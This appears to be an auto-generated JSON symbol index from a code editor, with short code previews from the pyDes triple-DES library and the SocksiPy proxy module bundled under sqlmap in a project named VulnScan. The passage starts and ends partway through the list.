        "peekOfCode": "\t\t\tself.__key3 = des(key[16:], self._mode, self._iv,\n\t\t\t\t\t  self._padding, self._padmode)\n\t\t_baseDes.setKey(self, key)\n\t# Override setter methods to work on all 3 keys.\n\tdef setMode(self, mode):\n\t\t\"\"\"Sets the type of crypting mode, pyDes.ECB or pyDes.CBC\"\"\"\n\t\t_baseDes.setMode(self, mode)\n\t\tfor key in (self.__key1, self.__key2, self.__key3):\n\t\t\tkey.setMode(mode)\n\tdef setPadding(self, pad):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tENCRYPT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tENCRYPT = des.ENCRYPT\n\t\tDECRYPT = des.DECRYPT\n\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\t# Pad the data accordingly.\n\t\tdata = self._padData(data, pad, padmode)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tDECRYPT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tDECRYPT = des.DECRYPT\n\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\t# Pad the data accordingly.\n\t\tdata = self._padData(data, pad, padmode)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())\n\t\t\tself.__key3.setIV(self.getIV())",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\t# Pad the data accordingly.\n\t\tdata = self._padData(data, pad, padmode)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())\n\t\t\tself.__key3.setIV(self.getIV())\n\t\t\ti = 0",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tpad",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\t# Pad the data accordingly.\n\t\tdata = self._padData(data, pad, padmode)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())\n\t\t\tself.__key3.setIV(self.getIV())\n\t\t\ti = 0\n\t\t\tresult = []\n\t\t\twhile i < len(data):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tdata = self._padData(data, pad, padmode)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())\n\t\t\tself.__key3.setIV(self.getIV())\n\t\t\ti = 0\n\t\t\tresult = []\n\t\t\twhile i < len(data):\n\t\t\t\tblock = self.__key1.crypt(data[i:i+8], ENCRYPT)\n\t\t\t\tblock = self.__key2.crypt(block, DECRYPT)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\ti",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\ti = 0\n\t\t\tresult = []\n\t\t\twhile i < len(data):\n\t\t\t\tblock = self.__key1.crypt(data[i:i+8], ENCRYPT)\n\t\t\t\tblock = self.__key2.crypt(block, DECRYPT)\n\t\t\t\tblock = self.__key3.crypt(block, ENCRYPT)\n\t\t\t\tself.__key1.setIV(block)\n\t\t\t\tself.__key2.setIV(block)\n\t\t\t\tself.__key3.setIV(block)\n\t\t\t\tresult.append(block)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tresult",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tresult = []\n\t\t\twhile i < len(data):\n\t\t\t\tblock = self.__key1.crypt(data[i:i+8], ENCRYPT)\n\t\t\t\tblock = self.__key2.crypt(block, DECRYPT)\n\t\t\t\tblock = self.__key3.crypt(block, ENCRYPT)\n\t\t\t\tself.__key1.setIV(block)\n\t\t\t\tself.__key2.setIV(block)\n\t\t\t\tself.__key3.setIV(block)\n\t\t\t\tresult.append(block)\n\t\t\t\ti += 8",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tblock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tblock = self.__key1.crypt(data[i:i+8], ENCRYPT)\n\t\t\t\tblock = self.__key2.crypt(block, DECRYPT)\n\t\t\t\tblock = self.__key3.crypt(block, ENCRYPT)\n\t\t\t\tself.__key1.setIV(block)\n\t\t\t\tself.__key2.setIV(block)\n\t\t\t\tself.__key3.setIV(block)\n\t\t\t\tresult.append(block)\n\t\t\t\ti += 8\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\treturn ''.join(result)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tblock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tblock = self.__key2.crypt(block, DECRYPT)\n\t\t\t\tblock = self.__key3.crypt(block, ENCRYPT)\n\t\t\t\tself.__key1.setIV(block)\n\t\t\t\tself.__key2.setIV(block)\n\t\t\t\tself.__key3.setIV(block)\n\t\t\t\tresult.append(block)\n\t\t\t\ti += 8\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\treturn ''.join(result)\n\t\t\telse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tblock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tblock = self.__key3.crypt(block, ENCRYPT)\n\t\t\t\tself.__key1.setIV(block)\n\t\t\t\tself.__key2.setIV(block)\n\t\t\t\tself.__key3.setIV(block)\n\t\t\t\tresult.append(block)\n\t\t\t\ti += 8\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\treturn ''.join(result)\n\t\t\telse:\n\t\t\t\treturn bytes.fromhex('').join(result)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tdata = self.__key1.crypt(data, ENCRYPT)\n\t\t\tdata = self.__key2.crypt(data, DECRYPT)\n\t\t\treturn self.__key3.crypt(data, ENCRYPT)\n\tdef decrypt(self, data, pad=None, padmode=None):\n\t\t\"\"\"decrypt(data, [pad], [padmode]) -> bytes\n\t\tdata : bytes to be encrypted\n\t\tpad  : Optional argument for decryption padding. Must only be one byte\n\t\tpadmode : Optional argument for overriding the padding mode.\n\t\tThe data must be a multiple of 8 bytes and will be decrypted\n\t\twith the already specified key. In PAD_NORMAL mode, if the",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tdata = self.__key2.crypt(data, DECRYPT)\n\t\t\treturn self.__key3.crypt(data, ENCRYPT)\n\tdef decrypt(self, data, pad=None, padmode=None):\n\t\t\"\"\"decrypt(data, [pad], [padmode]) -> bytes\n\t\tdata : bytes to be encrypted\n\t\tpad  : Optional argument for decryption padding. Must only be one byte\n\t\tpadmode : Optional argument for overriding the padding mode.\n\t\tThe data must be a multiple of 8 bytes and will be decrypted\n\t\twith the already specified key. In PAD_NORMAL mode, if the\n\t\toptional padding character is supplied, then the un-encrypted",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tENCRYPT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tENCRYPT = des.ENCRYPT\n\t\tDECRYPT = des.DECRYPT\n\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())\n\t\t\tself.__key3.setIV(self.getIV())\n\t\t\ti = 0",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tDECRYPT",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tDECRYPT = des.DECRYPT\n\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())\n\t\t\tself.__key3.setIV(self.getIV())\n\t\t\ti = 0\n\t\t\tresult = []",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\tdata = self._guardAgainstUnicode(data)\n\t\tif pad is not None:\n\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())\n\t\t\tself.__key3.setIV(self.getIV())\n\t\t\ti = 0\n\t\t\tresult = []\n\t\t\twhile i < len(data):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tpad",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tpad = self._guardAgainstUnicode(pad)\n\t\tif self.getMode() == CBC:\n\t\t\tself.__key1.setIV(self.getIV())\n\t\t\tself.__key2.setIV(self.getIV())\n\t\t\tself.__key3.setIV(self.getIV())\n\t\t\ti = 0\n\t\t\tresult = []\n\t\t\twhile i < len(data):\n\t\t\t\tiv = data[i:i+8]\n\t\t\t\tblock = self.__key3.crypt(iv,    DECRYPT)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\ti",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\ti = 0\n\t\t\tresult = []\n\t\t\twhile i < len(data):\n\t\t\t\tiv = data[i:i+8]\n\t\t\t\tblock = self.__key3.crypt(iv,    DECRYPT)\n\t\t\t\tblock = self.__key2.crypt(block, ENCRYPT)\n\t\t\t\tblock = self.__key1.crypt(block, DECRYPT)\n\t\t\t\tself.__key1.setIV(iv)\n\t\t\t\tself.__key2.setIV(iv)\n\t\t\t\tself.__key3.setIV(iv)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tresult",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tresult = []\n\t\t\twhile i < len(data):\n\t\t\t\tiv = data[i:i+8]\n\t\t\t\tblock = self.__key3.crypt(iv,    DECRYPT)\n\t\t\t\tblock = self.__key2.crypt(block, ENCRYPT)\n\t\t\t\tblock = self.__key1.crypt(block, DECRYPT)\n\t\t\t\tself.__key1.setIV(iv)\n\t\t\t\tself.__key2.setIV(iv)\n\t\t\t\tself.__key3.setIV(iv)\n\t\t\t\tresult.append(block)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tiv",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tiv = data[i:i+8]\n\t\t\t\tblock = self.__key3.crypt(iv,    DECRYPT)\n\t\t\t\tblock = self.__key2.crypt(block, ENCRYPT)\n\t\t\t\tblock = self.__key1.crypt(block, DECRYPT)\n\t\t\t\tself.__key1.setIV(iv)\n\t\t\t\tself.__key2.setIV(iv)\n\t\t\t\tself.__key3.setIV(iv)\n\t\t\t\tresult.append(block)\n\t\t\t\ti += 8\n\t\t\tif _pythonMajorVersion < 3:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tblock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tblock = self.__key3.crypt(iv,    DECRYPT)\n\t\t\t\tblock = self.__key2.crypt(block, ENCRYPT)\n\t\t\t\tblock = self.__key1.crypt(block, DECRYPT)\n\t\t\t\tself.__key1.setIV(iv)\n\t\t\t\tself.__key2.setIV(iv)\n\t\t\t\tself.__key3.setIV(iv)\n\t\t\t\tresult.append(block)\n\t\t\t\ti += 8\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\tdata = ''.join(result)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tblock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tblock = self.__key2.crypt(block, ENCRYPT)\n\t\t\t\tblock = self.__key1.crypt(block, DECRYPT)\n\t\t\t\tself.__key1.setIV(iv)\n\t\t\t\tself.__key2.setIV(iv)\n\t\t\t\tself.__key3.setIV(iv)\n\t\t\t\tresult.append(block)\n\t\t\t\ti += 8\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\tdata = ''.join(result)\n\t\t\telse:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tblock",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tblock = self.__key1.crypt(block, DECRYPT)\n\t\t\t\tself.__key1.setIV(iv)\n\t\t\t\tself.__key2.setIV(iv)\n\t\t\t\tself.__key3.setIV(iv)\n\t\t\t\tresult.append(block)\n\t\t\t\ti += 8\n\t\t\tif _pythonMajorVersion < 3:\n\t\t\t\tdata = ''.join(result)\n\t\t\telse:\n\t\t\t\tdata = bytes.fromhex('').join(result)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tdata = ''.join(result)\n\t\t\telse:\n\t\t\t\tdata = bytes.fromhex('').join(result)\n\t\telse:\n\t\t\tdata = self.__key3.crypt(data, DECRYPT)\n\t\t\tdata = self.__key2.crypt(data, ENCRYPT)\n\t\t\tdata = self.__key1.crypt(data, DECRYPT)\n\t\treturn self._unpadData(data, pad, padmode)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\t\tdata = bytes.fromhex('').join(result)\n\t\telse:\n\t\t\tdata = self.__key3.crypt(data, DECRYPT)\n\t\t\tdata = self.__key2.crypt(data, ENCRYPT)\n\t\t\tdata = self.__key1.crypt(data, DECRYPT)\n\t\treturn self._unpadData(data, pad, padmode)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tdata = self.__key3.crypt(data, DECRYPT)\n\t\t\tdata = self.__key2.crypt(data, ENCRYPT)\n\t\t\tdata = self.__key1.crypt(data, DECRYPT)\n\t\treturn self._unpadData(data, pad, padmode)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tdata = self.__key2.crypt(data, ENCRYPT)\n\t\t\tdata = self.__key1.crypt(data, DECRYPT)\n\t\treturn self._unpadData(data, pad, padmode)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "\t\t\tdata",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "description": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "peekOfCode": "\t\t\tdata = self.__key1.crypt(data, DECRYPT)\n\t\treturn self._unpadData(data, pad, padmode)",
        "detail": "VulnScan.modules.sqlmap.thirdparty.pydes.pyDes",
        "documentation": {}
    },
    {
        "label": "ProxyError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "class ProxyError(Exception): pass\nclass GeneralProxyError(ProxyError): pass\nclass Socks5AuthError(ProxyError): pass\nclass Socks5Error(ProxyError): pass\nclass Socks4Error(ProxyError): pass\nclass HTTPError(ProxyError): pass\n_generalerrors = (\"success\",\n    \"invalid data\",\n    \"not connected\",\n    \"not available\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "GeneralProxyError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "class GeneralProxyError(ProxyError): pass\nclass Socks5AuthError(ProxyError): pass\nclass Socks5Error(ProxyError): pass\nclass Socks4Error(ProxyError): pass\nclass HTTPError(ProxyError): pass\n_generalerrors = (\"success\",\n    \"invalid data\",\n    \"not connected\",\n    \"not available\",\n    \"bad proxy type\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "Socks5AuthError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "class Socks5AuthError(ProxyError): pass\nclass Socks5Error(ProxyError): pass\nclass Socks4Error(ProxyError): pass\nclass HTTPError(ProxyError): pass\n_generalerrors = (\"success\",\n    \"invalid data\",\n    \"not connected\",\n    \"not available\",\n    \"bad proxy type\",\n    \"bad input\")",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "Socks5Error",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "class Socks5Error(ProxyError): pass\nclass Socks4Error(ProxyError): pass\nclass HTTPError(ProxyError): pass\n_generalerrors = (\"success\",\n    \"invalid data\",\n    \"not connected\",\n    \"not available\",\n    \"bad proxy type\",\n    \"bad input\")\n_socks5errors = (\"succeeded\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "Socks4Error",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "class Socks4Error(ProxyError): pass\nclass HTTPError(ProxyError): pass\n_generalerrors = (\"success\",\n    \"invalid data\",\n    \"not connected\",\n    \"not available\",\n    \"bad proxy type\",\n    \"bad input\")\n_socks5errors = (\"succeeded\",\n    \"general SOCKS server failure\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "HTTPError",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "class HTTPError(ProxyError): pass\n_generalerrors = (\"success\",\n    \"invalid data\",\n    \"not connected\",\n    \"not available\",\n    \"bad proxy type\",\n    \"bad input\")\n_socks5errors = (\"succeeded\",\n    \"general SOCKS server failure\",\n    \"connection not allowed by ruleset\",",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "socksocket",
        "kind": 6,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "class socksocket(socket.socket):\n    \"\"\"socksocket([family[, type[, proto]]]) -> socket object\n    Open a SOCKS enabled socket. The parameters are the same as\n    those of the standard socket init. In order for SOCKS to work,\n    you must specify family=AF_INET, type=SOCK_STREAM and proto=0.\n    \"\"\"\n    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):\n        _orgsocket.__init__(self, family, type, proto, _sock)\n        if _defaultproxy != None:\n            self.__proxy = _defaultproxy",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "setdefaultproxy",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "def setdefaultproxy(proxytype=None, addr=None, port=None, rdns=True, username=None, password=None):\n    \"\"\"setdefaultproxy(proxytype, addr[, port[, rdns[, username[, password]]]])\n    Sets a default proxy which all further socksocket objects will use,\n    unless explicitly changed.\n    \"\"\"\n    global _defaultproxy\n    _defaultproxy = (proxytype, addr, port, rdns, username, password)\ndef wrapmodule(module):\n    \"\"\"wrapmodule(module)\n    Attempts to replace a module's socket library with a SOCKS socket. Must set",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "wrapmodule",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "def wrapmodule(module):\n    \"\"\"wrapmodule(module)\n    Attempts to replace a module's socket library with a SOCKS socket. Must set\n    a default proxy using setdefaultproxy(...) first.\n    This will only work on modules that import socket directly into the namespace;\n    most of the Python Standard Library falls into this category.\n    \"\"\"\n    if _defaultproxy != None:\n        module.socket.socket = socksocket\n        if _defaultproxy[0] == PROXY_TYPE_SOCKS4:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "unwrapmodule",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "def unwrapmodule(module):\n    module.socket.socket = _orgsocket\n    module.socket.create_connection = _orgcreateconnection\nclass socksocket(socket.socket):\n    \"\"\"socksocket([family[, type[, proto]]]) -> socket object\n    Open a SOCKS enabled socket. The parameters are the same as\n    those of the standard socket init. In order for SOCKS to work,\n    you must specify family=AF_INET, type=SOCK_STREAM and proto=0.\n    \"\"\"\n    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, _sock=None):",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "create_connection",
        "kind": 2,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "def create_connection(address, timeout=socket._GLOBAL_DEFAULT_TIMEOUT,\n                    source_address=None):\n    # Patched for a DNS-leakage\n    host, port = address\n    sock = None\n    try:\n        sock = socksocket(socket.AF_INET, socket.SOCK_STREAM)\n        if timeout is not socket._GLOBAL_DEFAULT_TIMEOUT:\n            sock.settimeout(timeout)\n        if source_address:",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "PROXY_TYPE_SOCKS4",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "PROXY_TYPE_SOCKS4 = 1\nPROXY_TYPE_SOCKS5 = 2\nPROXY_TYPE_HTTP = 3\n_defaultproxy = None\nsocket._orig_socket = _orgsocket = _orig_socket = socket.socket\n_orgcreateconnection = socket.create_connection\nclass ProxyError(Exception): pass\nclass GeneralProxyError(ProxyError): pass\nclass Socks5AuthError(ProxyError): pass\nclass Socks5Error(ProxyError): pass",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "PROXY_TYPE_SOCKS5",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "PROXY_TYPE_SOCKS5 = 2\nPROXY_TYPE_HTTP = 3\n_defaultproxy = None\nsocket._orig_socket = _orgsocket = _orig_socket = socket.socket\n_orgcreateconnection = socket.create_connection\nclass ProxyError(Exception): pass\nclass GeneralProxyError(ProxyError): pass\nclass Socks5AuthError(ProxyError): pass\nclass Socks5Error(ProxyError): pass\nclass Socks4Error(ProxyError): pass",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "PROXY_TYPE_HTTP",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "peekOfCode": "PROXY_TYPE_HTTP = 3\n_defaultproxy = None\nsocket._orig_socket = _orgsocket = _orig_socket = socket.socket\n_orgcreateconnection = socket.create_connection\nclass ProxyError(Exception): pass\nclass GeneralProxyError(ProxyError): pass\nclass Socks5AuthError(ProxyError): pass\nclass Socks5Error(ProxyError): pass\nclass Socks4Error(ProxyError): pass\nclass HTTPError(ProxyError): pass",
        "detail": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "documentation": {}
    },
    {
        "label": "_defaultproxy",
        "kind": 5,
        "importPath": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
        "description": "VulnScan.modules.sqlmap.thirdparty.socks.socks",
